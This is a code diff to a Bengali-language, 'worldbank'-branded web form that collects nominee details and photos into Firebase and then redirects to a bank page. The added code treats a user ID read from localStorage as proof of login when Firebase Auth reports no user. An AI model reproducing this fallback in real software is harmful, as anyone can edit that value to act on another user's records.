@@ -91,65 +91,32 @@
         }
         .loading-overlay.show { display: flex; }
 
-        .loading-content {
-            text-align: center;
-            max-width: 320px;
-            width: 100%;
-        }
+        .loading-content { text-align: center; max-width: 320px; width: 100%; }
 
         .loading-spinner-circle {
-            width: 90px;
-            height: 90px;
+            width: 90px; height: 90px;
             border: 6px solid #e2e8f0;
             border-top: 6px solid #1e88e5;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 25px auto;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .success-circle {
-            width: 90px;
-            height: 90px;
+            width: 90px; height: 90px;
             border: 6px solid #22c55e;
             border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            display: flex; justify-content: center; align-items: center;
             margin: 0 auto 25px auto;
             animation: popIn 0.5s ease;
         }
-        .success-circle i {
-            font-size: 45px;
-            color: #22c55e;
-            animation: tickIn 0.5s ease;
-        }
-        @keyframes popIn {
-            0% { transform: scale(0); }
-            80% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        @keyframes tickIn {
-            0% { transform: scale(0); opacity: 0; }
-            50% { opacity: 1; }
-            100% { transform: scale(1); opacity: 1; }
-        }
+        .success-circle i { font-size: 45px; color: #22c55e; animation: tickIn 0.5s ease; }
+        @keyframes popIn { 0% { transform: scale(0); } 80% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        @keyframes tickIn { 0% { transform: scale(0); opacity: 0; } 50% { opacity: 1; } 100% { transform: scale(1); opacity: 1; } }
 
-        .loading-text {
-            font-size: 18px;
-            font-weight: 700;
-            color: #0f172a;
-            margin-bottom: 10px;
-        }
-
-        .loading-subtext {
-            font-size: 14px;
-            color: #64748b;
-            font-weight: 500;
-        }
+        .loading-text { font-size: 18px; font-weight: 700; color: #0f172a; margin-bottom: 10px; }
+        .loading-subtext { font-size: 14px; color: #64748b; font-weight: 500; }
     </style>
 </head>
 <body>
@@ -262,7 +229,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getAuth, onAuthStateChanged, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
         import { getFirestore, doc, updateDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
         const firebaseConfig = {
@@ -275,49 +242,81 @@
             measurementId: "G-KK74DHYW69"
         };
 
-        const app = initializeApp(firebaseConfig);
+        // ★★★ Firebase App instance-এ একই নাম "worldbank-app" ★★★
+        const app = initializeApp(firebaseConfig, "worldbank-app");
         const auth = getAuth(app);
         const db = getFirestore(app);
 
+        // ★★★ Local persistence — সেশন সব ট্যাবে থাকবে ★★★
+        setPersistence(auth, browserLocalPersistence).catch((error) => {
+            console.error("Persistence error:", error);
+        });
+
         let currentUserUID = null;
         window.uploadedImages = {};
+        let authCheckDone = false;
 
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingContent = document.getElementById('loadingContent');
 
-        // ★★★ স্পিনার স্ক্রিন ★★★
         function showSavingScreen() {
             loadingContent.innerHTML = `
                 <div class="loading-spinner-circle"></div>
-                <div class="loading-text">আবেদন তথ্য জমা হচ্ছে...</div>
+                <div class="loading-text">নমিনীর তথ্য জমা হচ্ছে...</div>
                 <div class="loading-subtext">অনুগ্রহ করে অপেক্ষা করুন</div>
             `;
             loadingOverlay.classList.add('show');
         }
 
-        // ★★★ সফল স্ক্রিন ★★★
         function showSavedScreen() {
             loadingContent.innerHTML = `
                 <div class="success-circle">
                     <i class="fa-solid fa-check"></i>
                 </div>
-                <div class="loading-text">আবেদন তথ্য জমা সম্পন্ন হয়েছে</div>
+                <div class="loading-text">নমিনীর তথ্য জমা সম্পন্ন হয়েছে</div>
                 <div class="loading-subtext">ধন্যবাদ! পরবর্তী পেজে নিয়ে যাওয়া হচ্ছে...</div>
             `;
         }
 
-        // ★★★ বর্তমান ইউজার চেক ★★★
+        // ★★★ Firebase Auth + localStorage দুইটাই চেক ★★★
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 currentUserUID = user.uid;
+                authCheckDone = true;
+                console.log("✅ User found in Firebase Auth (nominee):", user.uid);
+                localStorage.setItem('worldbank_current_user', JSON.stringify({
+                    uid: user.uid,
+                    fullname: user.displayName || '',
+                    phone: user.email ? user.email.split('@')[0] : ''
+                }));
                 loadExistingData(user.uid);
             } else {
-                alert("আপনি লগইন করেননি! দয়া করে লগইন করুন।");
-                window.location.href = 'index.html';
+                const storedUser = localStorage.getItem('worldbank_current_user');
+                if (storedUser) {
+                    try {
+                        const parsedUser = JSON.parse(storedUser);
+                        if (parsedUser && parsedUser.uid) {
+                            currentUserUID = parsedUser.uid;
+                            authCheckDone = true;
+                            console.log("✅ User found in localStorage (nominee):", currentUserUID);
+                            loadExistingData(currentUserUID);
+                            return;
+                        }
+                    } catch (e) {
+                        console.error("LocalStorage parse error:", e);
+                    }
+                }
+                
+                setTimeout(() => {
+                    if (!authCheckDone) {
+                        console.log("❌ No user found anywhere (nominee)!");
+                        alert("আপনি লগইন করেননি! দয়া করে লগইন করুন।");
+                        window.location.href = 'index.html';
+                    }
+                }, 2000);
             }
         });
 
-        // ★★★ পুরাতন ডেটা লোড ★★★
         async function loadExistingData(uid) {
             try {
                 const userDoc = await getDoc(doc(db, "users", uid));
@@ -361,7 +360,6 @@
             }
         }
 
-        // ★★★ ছবি ছোট করার ফাংশন ★★★
         function resizeImage(file, maxWidth, maxHeight, quality, callback) {
             const reader = new FileReader();
             reader.onload = function(e) {
@@ -382,7 +380,6 @@
             reader.readAsDataURL(file);
         }
 
-        // ★★★ ছবি আপলোড সিস্টেম ★★★
         document.querySelectorAll('.upload-box').forEach(box => {
             const imageKey = box.getAttribute('data-img');
             const fileInput = document.createElement('input');
@@ -441,12 +438,24 @@
             }
         });
 
-        // ★★★ ফর্ম সাবমিট ★★★
         document.getElementById('nomineeForm').addEventListener('submit', async function(event) {
             event.preventDefault();
 
+            // ★★★ currentUserUID চেক — localStorage থেকেও ★★★
             if (!currentUserUID) {
-                alert("আপনি লগইন করেননি!");
+                const storedUser = localStorage.getItem('worldbank_current_user');
+                if (storedUser) {
+                    try {
+                        const parsedUser = JSON.parse(storedUser);
+                        if (parsedUser && parsedUser.uid) {
+                            currentUserUID = parsedUser.uid;
+                        }
+                    } catch (e) {}
+                }
+            }
+
+            if (!currentUserUID) {
+                alert("আপনি লগইন করেননি! দয়া করে লগইন করুন।");
                 window.location.href = 'index.html';
                 return;
             }
@@ -463,7 +472,6 @@
                 return;
             }
 
-            // ★★★ সাথে সাথেই স্পিনার স্ক্রিন দেখানো ★★★
             showSavingScreen();
 
             try {
@@ -472,11 +480,9 @@
                     nomineeData: nomineeData
                 });
 
-                // ★★★ ২ সেকেন্ড পর সফল স্ক্রিন ★★★
                 setTimeout(function() {
                     showSavedScreen();
 
-                    // ★★★ আর ১ সেকেন্ড পর bank.html এ পাঠানো ★★★
                     setTimeout(function() {
                         window.location.href = "bank.html";
                     }, 1000);
